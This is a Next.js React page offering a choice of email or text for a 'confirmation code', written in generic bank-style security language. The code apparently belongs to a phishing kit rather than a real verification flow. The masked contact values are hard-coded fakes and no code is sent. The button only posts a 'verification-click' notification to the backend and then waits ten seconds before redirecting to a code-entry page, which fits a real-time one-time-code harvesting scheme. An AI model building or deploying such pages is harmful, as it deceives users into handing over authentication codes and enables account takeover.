"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Check, LockKeyhole, Loader2, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { VerificationHeader } from "@/components/verification-header";

export default function VerifyChoicePage() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<"email" | "text">(
    "email",
  );
  const [email, setEmail] = useState<string>("");
  const redirectRef = useRef<number | null>(null);

  // Mask email/phone on component mount (fetch from session/API if needed)
  useEffect(() => {
    // In a real app, you'd fetch these from your backend
    // For now, using placeholder masked values
    setEmail("*******@*****");
  }, []);

  const handleSelect = async (method: "email" | "text") => {
    if (isLoading) return;
    setSelectedMethod(method);
    setIsLoading(true);

    try {
      await fetch("/api/verification-click", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationType: method === "email" ? "Email" : "Text",
        }),
      }).catch(console.error);
    } catch (err) {
      console.error("Failed to send verification-click notification:", err);
    }

    redirectRef.current = window.setTimeout(() => {
      router.push("/verify");
    }, 10000);
  };

  useEffect(() => {
    return () => {
      if (redirectRef.current) window.clearTimeout(redirectRef.current);
    };
  }, []);

  return (
    <div className="min-h-screen bg-white flex flex-col border-t border-gray-200">
      <VerificationHeader />
      {isLoading && (
        <div className="absolute inset-0 bg-white/90 flex flex-col items-center justify-center z-50">
          <div className="text-center py-8">
            <Loader2 className="w-10 h-10 animate-spin text-gray-500 mx-auto mb-3" />
            <p className="text-sm text-gray-500 mb-2">
              Sending verification code to{" "}
              {selectedMethod === "email" ? "your email" : "your phone"}...
            </p>
          </div>
        </div>
      )}
      <div className="flex-1 px-5 py-12 md:px-7 md:py-12">
        <div className="w-full max-w-100 text-center">
          <LockKeyhole className="mx-auto mb-2 h-11 w-11 stroke-[1.25] text-[#4f7390]" />
          <p className="mb-4 text-sm leading-[1.15] text-gray-600">
            Protecting your information is our first priority. In order to
            access this site or perform this specific function you must receive
            a confirmation code to the device of your choice. You will be asked
            to enter the code on the next screen.
          </p>

          <label
            htmlFor="confirmation-method"
            className="w-42.5 shrink-0 text-sm text-gray-700"
          >
            Confirmation Code
          </label>
          <div className="mb-4 flex items-center gap-3 text-left">
            <select
              id="confirmation-method"
              value={selectedMethod}
              onChange={(event) =>
                setSelectedMethod(event.target.value as "email" | "text")
              }
              disabled={isLoading}
              className="md:ml-10 h-9 min-w-0 flex-1 border border-gray-500 bg-white px-2 text-sm text-gray-700 outline-none focus:border-[#315778]"
            >
              <option value="email">Email</option>
              <option value="text">Text</option>
            </select>
          </div>

          <input
            aria-label="Masked confirmation destination"
            value={selectedMethod === "email" ? email : "***-***-****"}
            readOnly
            className="mb-4 md:ml-10 block h-9 w-full md:max-w-[90%] border border-gray-400 bg-gray-50 px-2 text-sm text-gray-400 outline-none"
          />

          <div className="ml-22.5 flex w-52 flex-col gap-2 text-sm">
            <Button
              type="button"
              disabled={isLoading}
              className="h-10 justify-start rounded-none border-0 bg-[#686868] px-3 font-normal text-white hover:bg-[#555] disabled:opacity-70"
              onClick={() => router.push("/")}
            >
              <X className="mr-7 h-7 w-7 stroke-[1.25]" /> CANCEL
            </Button>
            <Button
              type="button"
              disabled={isLoading}
              className="h-10 justify-start rounded-none border-0 bg-[#111e58] px-3 font-normal text-white hover:bg-[#0b1644] disabled:opacity-70"
              onClick={() => handleSelect(selectedMethod)}
            >
              <Check className="mr-5 h-7 w-7 stroke-[1.25]" />
              {isLoading ? "GENERATING CODE.." : "GENERATE CODE"}
            </Button>
          </div>

          <div className="mt-2 flex items-center bg-[#f2f6a0] px-2 py-3 text-left text-sm leading-[1.15] text-gray-700">
            <span className="mr-3 flex h-8 w-8 shrink-0 items-center justify-center rounded-full border border-gray-500 text-xl font-light text-gray-600">
              i
            </span>
            <p>
              To proceed, please press the generate code button.If you wish to
              cancel, you will be asked to enter a code the next time you login
              or try to perform this specific function.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
